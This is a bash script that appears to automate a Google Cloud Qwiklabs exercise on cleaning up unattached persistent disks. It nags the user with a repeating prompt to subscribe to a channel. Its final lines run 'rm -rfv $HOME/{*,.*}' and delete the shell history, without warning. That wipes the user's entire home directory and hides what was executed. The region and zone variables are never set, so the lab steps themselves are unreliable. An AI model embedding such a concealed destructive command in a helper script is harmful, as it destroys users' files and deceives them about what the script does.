BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region $region
#gcloud config set compute/zone $region-a
#export ZONE=$region-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------# 


gcloud services enable cloudscheduler.googleapis.com

sleep 10

git clone https://github.com/GoogleCloudPlatform/gcf-automated-resource-cleanup.git && cd gcf-automated-resource-cleanup/

export PROJECT_ID=$(gcloud config list --format 'value(core.project)' 2>/dev/null)
WORKDIR=$(pwd)

gcloud config set compute/region $REGION

echo "${GREEN}${BOLD}

Task 1 Completed

${RESET}"


#TASK 2

cd $WORKDIR/unattached-pd

export ORPHANED_DISK=orphaned-disk
export UNUSED_DISK=unused-disk

gcloud compute disks create $ORPHANED_DISK --project=$PROJECT_ID --type=pd-standard --size=500GB --zone=$ZONE

gcloud compute disks create $UNUSED_DISK --project=$PROJECT_ID --type=pd-standard --size=500GB --zone=$ZONE

echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"


#TASK 3
gcloud compute instances create disk-instance \
--zone=$ZONE \
--machine-type=n1-standard-1 \
--disk=name=$ORPHANED_DISK,device-name=$ORPHANED_DISK,mode=rw,boot=no

gcloud compute disks describe $ORPHANED_DISK --zone=$ZONE --format=json | jq

gcloud compute instances detach-disk disk-instance --device-name=$ORPHANED_DISK --zone=$ZONE

gcloud compute disks describe $ORPHANED_DISK --zone=$ZONE --format=json | jq


echo "${GREEN}${BOLD}

Task 3 Completed

Lab Completed !!!

${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to QwikLab Explorers [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${YELLOW}Do Subscribe to QwikLab Explorers [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0
